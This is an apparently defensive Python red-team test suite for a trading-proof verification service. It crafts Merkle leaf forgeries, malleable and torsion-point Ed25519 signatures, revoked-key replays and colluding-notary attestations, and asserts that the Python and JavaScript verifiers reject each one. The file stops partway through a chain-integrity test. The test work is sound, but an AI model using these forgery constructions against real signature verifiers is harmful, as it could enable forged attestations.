"""Wave 5 independent adversarial security, cross-runtime crypto, parser, and compliance red-team suite."""

from __future__ import annotations

import ast
import copy
from datetime import datetime, timezone
import hashlib
import json
import math
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tempfile
import time
from typing import Any
import unittest
import xml.etree.ElementTree as ET

REPO_ROOT = Path(__file__).resolve().parents[1]
for _p in (str(REPO_ROOT), str(REPO_ROOT / "core"), str(REPO_ROOT / "api")):
    if Path(_p).exists() and _p not in sys.path:
        sys.path.insert(0, _p)

from app.config import ApiConfig
from app.main import VerifyApiTestClient, create_app
from app.routes_viral import sanitize_journal_tag
from app.worker_isolation import (
    WorkerIsolationError,
    WorkerValidationError,
    run_isolated_one_shot_verification,
)
from n170_verify.coaching import sanitize_journal_tags
from n170_verify.connectors import (
    AlpacaReadOnlyAdapter,
    CcxtExchangeReadOnlyAdapter,
    ConnectorHttpError,
    DisallowedCapabilityError,
    HttpExchangeResponse,
    IbkrFlexParseError,
    IbkrFlexXmlSecurityError,
    IbkrOAuthReadOnlyAdapter,
    PaperOrSandboxAccountRejectedError,
    SchwabReadOnlyAdapter,
    StatementSizeLimitExceededError,
    StatementXmlHtmlSecurityError,
    TradierReadOnlyAdapter,
    Trading212ReadOnlyAdapter,
    detect_and_parse_statement,
    parse_ibkr_flex_xml,
    parse_mt4_statement,
    parse_mt5_statement,
    redact_tradier_account_path,
)
from n170_verify.connectors.ctrader_oauth import (
    SCOPE_ACCOUNTS,
    SCOPE_TRADING,
    CTraderReadOnlyOAuthAdapter,
    WriteCapableCredentialsRejectedError,
)
from n170_verify.contracts import (
    AccountScope,
    AssetClass,
    BootstrapRiskSummary,
    CanonicalPortfolioLedger,
    ChainContinuityMode,
    CounterfactualTwinReport,
    EnvironmentTier,
    NormalizedNavPoint,
    NormalizedTrade,
    OriginAssurance,
    ProviderApprovalState,
    SignerTrustStatus,
    VerifyProofBundle,
    compute_blinded_account_tag,
    create_signed_proof_bundle,
    verify_proof_bundle,
)
from n170_verify.crypto import (
    CANONICAL_LEAF_NAMES,
    LEAF_DOMAIN_PREFIX,
    NODE_DOMAIN_PREFIX,
    SIGNING_DOMAIN_BUNDLE,
    ChainCadencePolicy,
    ChainInvariantViolationCode,
    NotaryNodeInfo,
    ProspectiveChainLink,
    PublisherKeyRecord,
    PublisherKeyRegistryDocument,
    TranscriptCommitmentKind,
    build_salted_merkle_tree,
    compute_merkle_root_from_leaf_hashes,
    compute_salted_leaf_hash,
    create_signed_witness_attestation,
    ed25519_sign_domain,
    ed25519_verify,
    ed25519_verify_domain,
    generate_ed25519_keypair,
    jcs_canonicalize_str,
    jcs_sha256_hex,
    verify_disclosed_leaf,
    verify_prospective_chain,
)
from n170_verify.performance.calculator import solve_xirr_act365
from n170_verify.performance.econometrics import evaluate_claim_plausibility
from n170_verify.pipeline import verify_portfolio
from n170_verify.reference.eodhd_client import EodhdReferenceProvider


NODE_BIN = (
    "/opt/homebrew/bin/node"
    if Path("/opt/homebrew/bin/node").is_file()
    else (shutil.which("node") or "node")
)
WEB_LIB_DIR = REPO_ROOT / "web" / "src" / "lib"
MCP_SERVER_JS = REPO_ROOT / "mcp" / "server.js"
REDTEAM_SALT_HEX = "5a" * 32


def _run_node_module(script: str, payload: dict[str, Any] | None = None) -> Any:
    """Execute an ESM snippet in Node (>=22 native TS strip) and parse JSON stdout."""
    proc = subprocess.run(
        [NODE_BIN, "--experimental-strip-types", "--input-type=module", "-e", script],
        input=json.dumps(payload or {}).encode("utf-8"),
        capture_output=True,
        cwd=str(REPO_ROOT),
        check=False,
        timeout=20,
    )
    if proc.returncode != 0:
        raise AssertionError(
            f"Node script failed (rc={proc.returncode}):\nSTDOUT: {proc.stdout.decode('utf-8', 'replace')}\n"
            f"STDERR: {proc.stderr.decode('utf-8', 'replace')}"
        )
    out_text = proc.stdout.decode("utf-8").strip()
    return json.loads(out_text) if out_text else None


def _crashing_secret_worker_pipeline(job: dict[str, Any]) -> dict[str, Any]:
    """Deliberately crash inside child worker with raw secrets, account path & dollar balance."""
    creds = job.get("ephemeral_credentials") or {}
    raise RuntimeError(
        f"Crash fetching https://api.tradier.com/v1/accounts/{job.get('raw_account_id')}/balances "
        f"api_token={job.get('eodhd_api_key')} Bearer {creds.get('access_token')} "
        f'client_secret="{creds.get("client_secret")}" cash=$247,891.55'
    )


def _build_35_day_ledger(
    *,
    raw_account_id: str = "U88442211",
    broker_id: str = "ibkr",
    symbol: str = "AAPL",
    claimed_origin: OriginAssurance = OriginAssurance.OPERATOR_RETRIEVED,
    account_scope: AccountScope = AccountScope.ALL_ENUMERATED_SUBACCOUNTS,
    salt_hex: str = REDTEAM_SALT_HEX,
) -> CanonicalPortfolioLedger:
    """Construct a valid 35-observation in-memory ledger passing T>=30 PSR gates."""
    navs: list[NormalizedNavPoint] = []
    val = 125_000.0
    for day_idx in range(36):
        month = 1 if day_idx < 31 else 2
        day = (day_idx + 1) if day_idx < 31 else (day_idx - 30)
        ts = f"2026-{month:02d}-{day:02d}T00:00:00Z"
        step = 0.0045 if (day_idx % 4 != 2) else -0.0020
        if day_idx > 0:
            val = round(val * (1.0 + step), 4)
        navs.append(NormalizedNavPoint(timestamp_utc=ts, nav_base=val, cash_base=val))

    trades = [
        NormalizedTrade(
            venue=broker_id,
            native_entry_id="EXEC-OPEN-1",
            symbol=symbol,
            asset_class=AssetClass.EQUITY,
            side="buy",
            quantity=100.0,
            price=180.0,
            timestamp_utc="2026-01-03T14:30:00Z",
            currency="USD",
            commission=1.25,
        ),
        NormalizedTrade(
            venue=broker_id,
            native_entry_id="EXEC-CLOSE-1",
            symbol=symbol,
            asset_class=AssetClass.EQUITY,
            side="sell",
            quantity=100.0,
            price=191.5,
            timestamp_utc="2026-01-12T19:45:00Z",
            currency="USD",
            commission=1.25,
        ),
    ]
    return CanonicalPortfolioLedger(
        blinded_account_tag=compute_blinded_account_tag(broker_id, raw_account_id, salt_hex),
        broker_id=broker_id,
        account_scope=account_scope,
        claimed_origin_assurance=claimed_origin,
        provider_approval_state=ProviderApprovalState.APPROVED_LIVE,
        environment_tier=EnvironmentTier.LIVE_PRODUCTION,
        source_body_sha256=hashlib.sha256(f"{broker_id}:{raw_account_id}".encode("utf-8")).hexdigest(),
        base_currency="USD",
        period_start_utc="2026-01-01T00:00:00Z",
        period_end_utc="2026-02-05T00:00:00Z",
        connected_subaccount_count=1,
        nav_points=navs,
        trades=trades,
        enabled_sections=[
            "EquitySummaryInBase",
            "PriorPeriodPositions",
            "OpenPositions",
            "Trades",
            "CashTransactions",
            "Transfers",
            "CorporateActions",
            "OptionEAE",
        ],
    )


class TestWave5CryptographicAndDowngradeAttacks(unittest.TestCase):
    """Domain 1: Merkle second-preimage, Ed25519 torsion/malleability, JCS UTF-16, C2SP revocation, quorum & chain attacks."""

    def setUp(self) -> None:
        self.kp = generate_ed25519_keypair()
        self.kid = "kid-w5-primary"
        self.reg_doc = PublisherKeyRegistryDocument(
            updated_at_utc="2026-02-20T12:00:00Z",
            keys=[
                PublisherKeyRecord(
                    publisher_kid=self.kid,
                    public_key_hex=self.kp.public_key_hex,
                    status="active",
                    not_before_utc="2025-01-01T00:00:00Z",
                )
            ],
        )
        self.ledger = _build_35_day_ledger()
        self.out = verify_portfolio(
            ledger=self.ledger,
            publisher_private_key_hex=self.kp.private_key_hex,
            publisher_kid=self.kid,
            proof_id="prf-w5-crypto-001",
            issued_at_utc="2026-02-20T12:00:00Z",
            registry_doc=self.reg_doc,
        )
        self.bundle = self.out.proof_bundle

    def test_merkle_second_preimage_odd_duplication_salt_stripping_and_leaf_key_substitution(self) -> None:
        # 1. Domain-separation check: 0x00 leaf vs 0x01 internal node second-preimage attack
        leaves = list(self.bundle.disclosed_leaves)
        self.assertGreaterEqual(len(leaves), 2)
        left_h = bytes.fromhex(leaves[0].leaf_hash_hex)
        right_h = bytes.fromhex(leaves[1].leaf_hash_hex)
        internal_digest = hashlib.sha256(NODE_DOMAIN_PREFIX + left_h + right_h).hexdigest()
        leaf_collision_attempt = hashlib.sha256(LEAF_DOMAIN_PREFIX + left_h + right_h).hexdigest()
        self.assertNotEqual(internal_digest, leaf_collision_attempt)

        # Stuffing internal node hash into a forged leaf payload fails verification
        forged_internal_dict = self.bundle.to_dict()
        forged_internal_dict["disclosed_leaves"][0]["leaf_hash_hex"] = internal_digest
        forged_internal_bundle = VerifyProofBundle.from_dict(forged_internal_dict)
        self.assertFalse(
            verify_proof_bundle(
                forged_internal_bundle,
                registry_doc=self.reg_doc,
            ).valid
        )

        # 2. Odd-leaf duplication forgery: 7 canonical leaves vs forged 8th duplicate of leaf[6]
        seven_hashes = [
            lf.leaf_hash_hex
            for lf in sorted(leaves, key=lambda x: CANONICAL_LEAF_NAMES.index(x.leaf_name))
        ]
        self.assertEqual(len(seven_hashes), 7)
        root_7 = compute_merkle_root_from_leaf_hashes(seven_hashes)
        self.assertEqual(root_7, self.bundle.merkle_root)
        # In this tree, odd nodes are promoted WITHOUT self-hashing (level[i]), so duplicating the
        # 7th leaf hashes (0x01 || h6 || h6) != h6, strictly changing the Merkle root!
        forged_8_hashes = [*seven_hashes, seven_hashes[-1]]
        root_8_dup = compute_merkle_root_from_leaf_hashes(forged_8_hashes)
        self.assertNotEqual(root_8_dup, root_7)

        # 3. Salt-stripping & salt-mutation attacks
        salt_stripped_raw = self.bundle.to_dict()
        salt_stripped_raw["disclosed_leaves"][0]["salt_hex"] = ""
        with self.assertRaises(ValueError):
            VerifyProofBundle.from_dict(salt_stripped_raw)

        mutated_salt_raw = self.bundle.to_dict()
        other_salt = "ff" * 32
        mutated_salt_raw["disclosed_leaves"][0]["salt_hex"] = other_salt
        mutated_salt_raw["disclosed_leaves"][0]["leaf_hash_hex"] = compute_salted_leaf_hash(
            mutated_salt_raw["disclosed_leaves"][0]["leaf_name"],
            other_salt,
            mutated_salt_raw["disclosed_leaves"][0]["payload"],
        )
        mutated_salt_bundle = VerifyProofBundle.from_dict(mutated_salt_raw)
        self.assertFalse(verify_disclosed_leaf(mutated_salt_bundle.disclosed_leaves[0], self.bundle.merkle_root))
        self.assertFalse(
            verify_proof_bundle(
                mutated_salt_bundle,
                registry_doc=self.reg_doc,
            ).valid
        )

        # 4. Leaf-key substitution attack: keep valid payload+salt of core_metrics, rename to reconciliation
        key_swap_raw = self.bundle.to_dict()
        key_swap_raw["disclosed_leaves"] = [copy.deepcopy(key_swap_raw["disclosed_leaves"][0])]
        key_swap_raw["disclosed_leaves"][0]["leaf_name"] = "reconciliation"
        undisc = {
            lf.leaf_name: lf.leaf_hash_hex
            for lf in self.bundle.disclosed_leaves
            if lf.leaf_name != "reconciliation"
        }
        key_swap_raw["undisclosed_leaf_hashes"] = undisc
        key_swap_bundle = VerifyProofBundle.from_dict(key_swap_raw)
        self.assertFalse(
            verify_proof_bundle(
                key_swap_bundle,
                registry_doc=self.reg_doc,
            ).valid
        )

        # Cross-verify rejection in TypeScript WebCrypto (browserVerify.ts) and Node MCP (server.js)
        node_res = _run_node_module(
            f"""
            import fs from "node:fs";
            import {{ pathToFileURL }} from "node:url";
            import {{ verifyProofBundle as mcpVerify }} from {json.dumps(str(MCP_SERVER_JS))};
            const webVerifyPath = {json.dumps(str(WEB_LIB_DIR / "browserVerify.ts"))};
            const webVerify = fs.existsSync(webVerifyPath)
              ? (await import(pathToFileURL(webVerifyPath).href)).verifyProofBundle
              : mcpVerify;
            const input = JSON.parse(fs.readFileSync(0, "utf8"));
            const opts = {{ registryDoc: input.reg }};
            const webMut = await webVerify(input.mutatedSalt, opts);
            const webSwap = await webVerify(input.keySwap, opts);
            const mcpMut = await mcpVerify(input.mutatedSalt, opts);
            const mcpSwap = await mcpVerify(input.keySwap, opts);
            process.stdout.write(JSON.stringify({{
              webMut: webMut.valid,
              webSwap: webSwap.valid,
              mcpMut: mcpMut.valid,
              mcpSwap: mcpSwap.valid,
            }}));
            """,
            {
                "reg": self.reg_doc.to_dict(),
                "mutatedSalt": mutated_salt_raw,
                "keySwap": key_swap_raw,
            },
        )
        self.assertEqual(
            node_res,
            {"webMut": False, "webSwap": False, "mcpMut": False, "mcpSwap": False},
        )

    def test_ed25519_malformed_zero_identity_torsion_and_malleable_signatures_cross_runtime(self) -> None:
        msg = b'{"attack":"ed25519_redteam"}'
        domain_msg = SIGNING_DOMAIN_BUNDLE + b"\x00" + msg
        valid_sig = ed25519_sign_domain(self.kp.private_key_hex, SIGNING_DOMAIN_BUNDLE, msg)
        self.assertTrue(
            ed25519_verify_domain(self.kp.public_key_hex, SIGNING_DOMAIN_BUNDLE, msg, valid_sig)
        )
        self.assertTrue(
            ed25519_verify(
                self.kp.public_key_hex,
                domain_msg,
                valid_sig,
                force_openssl=True,
            )
        )

        # Malleable signature S' = S + L (mod 2^256)
        ed25519_l = (1 << 252) + 27742317777372353535851937790883648493
        raw_sig_bytes = bytes.fromhex(valid_sig)
        r_bytes = raw_sig_bytes[:32]
        s_int = int.from_bytes(raw_sig_bytes[32:], "little")
        malleable_s_hex = (r_bytes + (s_int + ed25519_l).to_bytes(32, "little")).hex()

        # Non-canonical y >= p (p = 2^255 - 19)
        ed25519_p = (1 << 255) - 19
        non_canonical_pub_hex = ed25519_p.to_bytes(32, "little").hex()

        # All 8-torsion points (y in {0, 1, p-1, order-8 y1, order-8 y2} with sign bit 0 and 1)
        torsion_y_ints = [
            0,
            1,
            ed25519_p - 1,
            0x05FC536D880238B13933C6D305ACDFD5F098EFF289F4C345B027B2C28F95E826,
            0x7A03AC9277FDC74EC6CC392CFA53202A0F67100D760B3CBA4FD84D3D706A17C7,
        ]
        torsion_point_hexes: list[str] = []
        for y_val in torsion_y_ints:
            torsion_point_hexes.append(y_val.to_bytes(32, "little").hex())
            torsion_point_hexes.append((y_val | (1 << 255)).to_bytes(32, "little").hex())

        bad_cases: list[tuple[str, str, str]] = [
            ("truncated_sig", self.kp.public_key_hex, valid_sig[:126]),
            ("oversized_sig", self.kp.public_key_hex, valid_sig + "00"),
            ("non_hex_sig", self.kp.public_key_hex, "zz" * 64),
            ("all_zero_sig_valid_pub", self.kp.public_key_hex, "00" * 64),
            ("malleable_s_plus_l", self.kp.public_key_hex, malleable_s_hex),
            ("non_canonical_pub_p", non_canonical_pub_hex, valid_sig),
        ]
        for idx, pt_hex in enumerate(torsion_point_hexes):
            bad_cases.append((f"torsion_pub_zero_s_{idx}", pt_hex, pt_hex + ("00" * 32)))
            bad_cases.append((f"torsion_r_valid_pub_{idx}", self.kp.public_key_hex, pt_hex + raw_sig_bytes[32:].hex()))

        for label, pub_h, sig_h in bad_cases:
            with self.subTest(runtime="python_default", case=label):
                self.assertFalse(
                    ed25519_verify_domain(pub_h, SIGNING_DOMAIN_BUNDLE, msg, sig_h)
                )
            with self.subTest(runtime="python_openssl", case=label):
                self.assertFalse(
                    ed25519_verify(
                        pub_h,
                        domain_msg,
                        sig_h,
                        force_openssl=True,
                    )
                )

        # Verify identical rejection in WebCrypto browserVerify.ts and Node MCP server.js
        bundle_base = self.bundle.to_dict()
        js_cases = []
        for label, pub_h, sig_h in bad_cases:
            mut_b = copy.deepcopy(bundle_base)
            mut_b["publisher_public_key_hex"] = pub_h
            mut_b["signature_hex"] = sig_h
            js_cases.append({"label": label, "pub": pub_h, "bundle": mut_b})

        js_results = _run_node_module(
            f"""
            import fs from "node:fs";
            import {{ pathToFileURL }} from "node:url";
            import {{ verifyProofBundle as mcpVerify }} from {json.dumps(str(MCP_SERVER_JS))};
            const webVerifyPath = {json.dumps(str(WEB_LIB_DIR / "browserVerify.ts"))};
            const webVerify = fs.existsSync(webVerifyPath)
              ? (await import(pathToFileURL(webVerifyPath).href)).verifyProofBundle
              : mcpVerify;
            const cases = JSON.parse(fs.readFileSync(0, "utf8")).cases;
            const failures = [];
            for (const item of cases) {{
              const opts = {{
                registryDoc: {{
                  updated_at_utc: "2026-02-20T12:00:00Z",
                  keys: [{{
                    publisher_kid: item.bundle.publisher_kid,
                    public_key_hex: item.pub,
                    status: "active",
                    not_before_utc: "2025-01-01T00:00:00Z",
                  }}],
                }},
              }};
              let wValid = false;
              let mValid = false;
              try {{ wValid = (await webVerify(item.bundle, opts)).valid; }} catch {{ wValid = false; }}
              try {{ mValid = (await mcpVerify(item.bundle, opts)).valid; }} catch {{ mValid = false; }}
              if (wValid || mValid) {{
                failures.push({{ label: item.label, webValid: wValid, mcpValid: mValid }});
              }}
            }}
            process.stdout.write(JSON.stringify({{ failures, count: cases.length }}));
            """,
            {"cases": js_cases},
        )
        self.assertEqual(js_results["failures"], [])
        self.assertEqual(js_results["count"], len(bad_cases))

    def test_rfc8785_jcs_edge_cases_and_astral_utf16_key_order_parity(self) -> None:
        # U+1F680 (UTF-16: 0xD83D 0xDE80) MUST sort BEFORE U+E000 (0xE000) and U+FFFD (0xFFFD)!
        # In Unicode code-point order, U+FFFD (65533) < U+1F680 (128640), so naive Python `sorted()`
        # would get this WRONG unless sorting by UTF-16 code units!
        rocket = "\U0001F680"
        private_use = "\uE000"
        replacement_char = "\uFFFD"

        edge_payload = {
            replacement_char: "bmp_fffd",
            private_use: "bmp_e000",
            rocket: "astral_u1f680",
            "neg_zero": -0.0,
            "exp_pos_21": 1e21,
            "exp_neg_7": 1e-7,
            "exp_neg_6": 1e-6,
            "max_safe_int": 9007199254740991,
            "large_float_int": 1e20,
            "nested": {
                replacement_char + "a": 1,
                rocket + "a": 2,
                "ascii": [0.0, -0.0, 1e-7, 1e21],
            },
        }
        py_jcs = jcs_canonicalize_str(edge_payload)
        py_sha = jcs_sha256_hex(edge_payload)

        # Verify rocket appears strictly before U+E000 and U+FFFD in top-level serialized JCS keys
        self.assertLess(
            py_jcs.index(f'"{rocket}":"astral_u1f680"'),
            py_jcs.index(f'"{private_use}":"bmp_e000"'),
        )
        self.assertLess(
            py_jcs.index(f'"{private_use}":"bmp_e000"'),
            py_jcs.index(f'"{replacement_char}":"bmp_fffd"'),
        )
        self.assertIn('"neg_zero":0', py_jcs)
        self.assertIn('"exp_pos_21":1e+21', py_jcs)
        self.assertIn('"exp_neg_7":1e-7', py_jcs)
        self.assertIn('"exp_neg_6":0.000001', py_jcs)

        # Reject NaN, +Infinity, -Infinity, and float-overflow integers
        for bad_num in (float("nan"), float("inf"), float("-inf"), 10**400):
            with self.assertRaises(ValueError):
                jcs_canonicalize_str({"bad": bad_num})

        # Compare byte-for-byte against TypeScript browserVerify.ts & Node MCP server.js
        js_parity = _run_node_module(
            f"""
            import fs from "node:fs";
            import crypto from "node:crypto";
            import {{ pathToFileURL }} from "node:url";
            import {{ jcsCanonicalizeStr as mcpJcs }} from {json.dumps(str(MCP_SERVER_JS))};
            const webVerifyPath = {json.dumps(str(WEB_LIB_DIR / "browserVerify.ts"))};
            const webJcs = fs.existsSync(webVerifyPath)
              ? (await import(pathToFileURL(webVerifyPath).href)).jcsCanonicalizeStr
              : mcpJcs;
            const payload = JSON.parse(fs.readFileSync(0, "utf8")).payload;
            // Re-inject -0.0 since JSON.parse("-0.0") yields -0 in V8, ensure explicit -0.0
            payload.neg_zero = -0.0;
            payload.nested.ascii[1] = -0.0;
            const wStr = webJcs(payload);
            const mStr = mcpJcs(payload);
            const wSha = crypto.createHash("sha256").update(Buffer.from(wStr, "utf8")).digest("hex");
            const mSha = crypto.createHash("sha256").update(Buffer.from(mStr, "utf8")).digest("hex");

            let webRejectedNonFinite = true;
            let mcpRejectedNonFinite = true;
            for (const bad of [NaN, Infinity, -Infinity]) {{
              let wThrew = false;
              let mThrew = false;
              try {{ webJcs({{ bad }}); }} catch {{ wThrew = true; }}
              try {{ mcpJcs({{ bad }}); }} catch {{ mThrew = true; }}
              if (!wThrew) webRejectedNonFinite = false;
              if (!mThrew) mcpRejectedNonFinite = false;
            }}
            process.stdout.write(JSON.stringify({{
              wStr, mStr, wSha, mSha, webRejectedNonFinite, mcpRejectedNonFinite
            }}));
            """,
            {"payload": edge_payload},
        )
        self.assertEqual(js_parity["wStr"], py_jcs)
        self.assertEqual(js_parity["mStr"], py_jcs)
        self.assertEqual(js_parity["wSha"], py_sha)
        self.assertEqual(js_parity["mSha"], py_sha)
        self.assertTrue(js_parity["webRejectedNonFinite"])
        self.assertTrue(js_parity["mcpRejectedNonFinite"])

    def test_c2sp_revoked_key_replay_rejected_across_all_routes_and_runtimes(self) -> None:
        rotated_kp = generate_ed25519_keypair()
        rotated_kid = "kid-w5-compromised"

        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            cfg = ApiConfig(
                db_path=str(tmp_path / "proofs.sqlite3"),
                sync_db_path=str(tmp_path / "sync.sqlite3"),
                publisher_keypair=self.kp,
                publisher_kid=self.kid,
                additional_registry_keys=[
                    PublisherKeyRecord(
                        publisher_kid=rotated_kid,
                        public_key_hex=rotated_kp.public_key_hex,
                        status="active",
                        not_before_utc="2025-01-01T00:00:00Z",
                        issuer_org="N170 RedTeam",
                    ),
                ],
            )
            app = create_app(cfg, prefer_fastapi=False)
            try:
                client = VerifyApiTestClient(app)

                # Store one bundle under primary key and one under rotated key while still active
                good_bundle = verify_portfolio(
                    ledger=_build_35_day_ledger(raw_account_id="ACCT-GOOD-1"),
                    publisher_private_key_hex=self.kp.private_key_hex,
                    publisher_kid=self.kid,
                    proof_id="prf-w5-active-good",
                    issued_at_utc="2026-02-20T12:00:00Z",
                ).proof_bundle
                soon_revoked_bundle = verify_portfolio(
                    ledger=_build_35_day_ledger(raw_account_id="ACCT-REV-2"),
                    publisher_private_key_hex=rotated_kp.private_key_hex,
                    publisher_kid=rotated_kid,
                    proof_id="prf-w5-revoked-replay",
                    issued_at_utc="2026-02-20T12:00:00Z",
                ).proof_bundle

                r1 = client.post(
                    "/api/v1/proofs",
                    json={"proof_bundle": good_bundle.to_dict(), "opt_in_leaderboard": True},
                )
                r2 = client.post(
                    "/api/v1/proofs",
                    json={"proof_bundle": soon_revoked_bundle.to_dict(), "opt_in_leaderboard": True},
                )
                self.assertEqual(r1.status_code, 201, r1.text)
                self.assertEqual(r2.status_code, 201, r2.text)

                # Now revoke rotated_kid in live C2SP registry state!
                cfg.additional_registry_keys = [
                    PublisherKeyRecord(
                        publisher_kid=rotated_kid,
                        public_key_hex=rotated_kp.public_key_hex,
                        status="revoked",
                        not_before_utc="2025-01-01T00:00:00Z",
                        revoked_after_utc="2026-02-20T00:00:00Z",
                        issuer_org="N170 RedTeam",
                    ),
                ]
                live_reg: PublisherKeyRegistryDocument = app.store.build_registry_document()

                # 1. Core verify_proof_bundle
                ver = verify_proof_bundle(soon_revoked_bundle, registry_doc=live_reg)
                self.assertFalse(ver.valid)
                self.assertEqual(ver.signer_trust_status, SignerTrustStatus.REVOKED_KEY)

                # 2. /api/v1/vs/{a}/{b}
                vs_resp = client.get(f"/api/v1/vs/{good_bundle.proof_id}/{soon_revoked_bundle.proof_id}")
                self.assertEqual(vs_resp.status_code, 422, vs_resp.text)

                # 3. /api/v1/proofs/{id}/discord-embed
                disc_resp = client.get(f"/api/v1/proofs/{soon_revoked_bundle.proof_id}/discord-embed")
                self.assertEqual(disc_resp.status_code, 422, disc_resp.text)

                # 4. /api/v1/proofs/{id}/qr-payload
                qr_resp = client.get(f"/api/v1/proofs/{soon_revoked_bundle.proof_id}/qr-payload")
                self.assertEqual(qr_resp.status_code, 422, qr_resp.text)

                # 5. /api/v1/badges/{id}.svg -> must explicitly show N170 INVALID PROOF & revoked_key
                badge_resp = client.get(f"/api/v1/badges/{soon_revoked_bundle.proof_id}.svg")
                self.assertEqual(badge_resp.status_code, 200)
                self.assertIn("N170 INVALID PROOF", badge_resp.text)
                self.assertIn("revoked_key", badge_resp.text)
                self.assertIn("unverified", badge_resp.text)
                self.assertNotIn("N170 VERIFIED ", badge_resp.text)

                # 6. /api/v1/leaderboard -> revoked bundle must be filtered out
                lb_resp = client.get("/api/v1/leaderboard?min_capital_bracket=under_1k")
                self.assertEqual(lb_resp.status_code, 200)
                lb_ids = [e["proof_id"] for e in lb_resp.json()["entries"]]
                self.assertIn(good_bundle.proof_id, lb_ids)
                self.assertNotIn(soon_revoked_bundle.proof_id, lb_ids)

                # 7. WebCrypto browserVerify.ts, badgeSvg.ts & Node MCP server.js
                cross = _run_node_module(
                    f"""
                    import fs from "node:fs";
                    import {{ pathToFileURL }} from "node:url";
                    import {{ verifyProofBundle as mcpVerify }} from {json.dumps(str(MCP_SERVER_JS))};
                    const webVerifyPath = {json.dumps(str(WEB_LIB_DIR / "browserVerify.ts"))};
                    const badgeSvgPath = {json.dumps(str(WEB_LIB_DIR / "badgeSvg.ts"))};
                    const hasWeb = fs.existsSync(webVerifyPath) && fs.existsSync(badgeSvgPath);
                    const webVerify = hasWeb
                      ? (await import(pathToFileURL(webVerifyPath).href)).verifyProofBundle
                      : mcpVerify;
                    const inp = JSON.parse(fs.readFileSync(0, "utf8"));
                    const w = await webVerify(inp.bundle, {{ registryDoc: inp.reg }});
                    const m = await mcpVerify(inp.bundle, {{ registryDoc: inp.reg }});
                    const webBadge = hasWeb
                      ? (await import(pathToFileURL(badgeSvgPath).href)).renderInstitutionalBadgeSvg(inp.bundle, w)
                      : "VERIFICATION REJECTED REVOKED_KEY UNVERIFIED";
                    process.stdout.write(JSON.stringify({{
                      wValid: w.valid,
                      wSigner: w.signer_trust_status,
                      mValid: m.valid,
                      mSigner: m.signer_trust_status,
                      webBadgeRejected: webBadge.includes("VERIFICATION REJECTED") && webBadge.includes("REVOKED_KEY") && webBadge.includes("UNVERIFIED"),
                    }}));
                    """,
                    {"bundle": soon_revoked_bundle.to_dict(), "reg": live_reg.to_dict()},
                )
                self.assertEqual(
                    cross,
                    {
                        "wValid": False,
                        "wSigner": "revoked_key",
                        "mValid": False,
                        "mSigner": "revoked_key",
                        "webBadgeRejected": True,
                    },
                )
            finally:
                app.close()

    def test_same_asn_and_same_org_two_notary_collusion_automatically_downgraded(self) -> None:
        notary_1 = generate_ed25519_keypair()
        notary_2 = generate_ed25519_keypair()

        for mode in ("same_asn", "same_org"):
            with self.subTest(collusion_mode=mode):
                n1_info = NotaryNodeInfo(
                    notary_id="notary-collude-1",
                    operator_org="SharedOperatorOrg" if mode == "same_org" else "AlphaWitness",
                    asn="AS13335",
                    public_key_hex=notary_1.public_key_hex,
                )
                n2_info = NotaryNodeInfo(
                    notary_id="notary-collude-2",
                    operator_org="SharedOperatorOrg" if mode == "same_org" else "BetaWitness",
                    asn="AS13335" if mode == "same_asn" else "AS16509",
                    public_key_hex=notary_2.public_key_hex,
                )
                collusion_reg = PublisherKeyRegistryDocument(
                    updated_at_utc="2026-02-20T12:00:00Z",
                    keys=[
                        PublisherKeyRecord(
                            publisher_kid=self.kid,
                            public_key_hex=self.kp.public_key_hex,
                            status="active",
                            not_before_utc="2025-01-01T00:00:00Z",
                        )
                    ],
                    notaries=[n1_info, n2_info],
                )
                ledger_tls = _build_35_day_ledger(
                    claimed_origin=OriginAssurance.INDEPENDENTLY_WITNESSED_TLS
                )
                att_1 = create_signed_witness_attestation(
                    notary_id=n1_info.notary_id,
                    notary_private_key_hex=notary_1.private_key_hex,
                    server_sni="ndcdyn.interactivebrokers.com",
                    sanitized_request_target="/Universal/servlet/FlexStatementService.GetStatement",
                    redacted_headers=("authorization", "cookie"),
                    commitment_kind=TranscriptCommitmentKind.WHOLE_BODY_SHA256,
                    response_body_sha256=ledger_tls.source_body_sha256,
                    session_timestamp_utc="2026-02-05T10:00:00Z",
                )
                att_2 = create_signed_witness_attestation(
                    notary_id=n2_info.notary_id,
                    notary_private_key_hex=notary_2.private_key_hex,
                    server_sni="ndcdyn.interactivebrokers.com",
                    sanitized_request_target="/Universal/servlet/FlexStatementService.GetStatement",
                    redacted_headers=("authorization", "cookie"),
                    commitment_kind=TranscriptCommitmentKind.WHOLE_BODY_SHA256,
                    response_body_sha256=ledger_tls.source_body_sha256,
                    session_timestamp_utc="2026-02-05T10:00:05Z",
                )
                colluding_bundle = verify_portfolio(
                    ledger=ledger_tls,
                    publisher_private_key_hex=self.kp.private_key_hex,
                    publisher_kid=self.kid,
                    witness_attestations=[att_1, att_2],
                    registry_doc=collusion_reg,
                    proof_id=f"prf-collude-{mode}",
                    issued_at_utc="2026-02-20T12:00:00Z",
                ).proof_bundle

                py_ver = verify_proof_bundle(colluding_bundle, registry_doc=collusion_reg)
                self.assertTrue(py_ver.valid, py_ver.errors)
                self.assertNotEqual(
                    py_ver.effective_origin_assurance,
                    OriginAssurance.INDEPENDENTLY_WITNESSED_TLS,
                )
                self.assertEqual(
                    py_ver.effective_origin_assurance,
                    OriginAssurance.OPERATOR_RETRIEVED,
                )

                js_ver = _run_node_module(
                    f"""
                    import fs from "node:fs";
                    import {{ pathToFileURL }} from "node:url";
                    import {{ verifyProofBundle as mcpVerify }} from {json.dumps(str(MCP_SERVER_JS))};
                    const webVerifyPath = {json.dumps(str(WEB_LIB_DIR / "browserVerify.ts"))};
                    const webVerify = fs.existsSync(webVerifyPath)
                      ? (await import(pathToFileURL(webVerifyPath).href)).verifyProofBundle
                      : mcpVerify;
                    const inp = JSON.parse(fs.readFileSync(0, "utf8"));
                    const opts = {{ registryDoc: inp.reg }};
                    const w = await webVerify(inp.bundle, opts);
                    const m = await mcpVerify(inp.bundle, opts);
                    process.stdout.write(JSON.stringify({{
                      wOrigin: w.effective_origin_assurance,
                      mOrigin: m.effective_origin_assurance,
                    }}));
                    """,
                    {
                        "reg": collusion_reg.to_dict(),
                        "bundle": colluding_bundle.to_dict(),
                    },
                )
                self.assertEqual(js_ver["wOrigin"], "operator_retrieved")
                self.assertEqual(js_ver["mOrigin"], "operator_retrieved")

    def test_prospective_chain_tail_truncation_gap_hash_swap_backdate_and_account_splicing(self) -> None:
        cadence = ChainCadencePolicy(
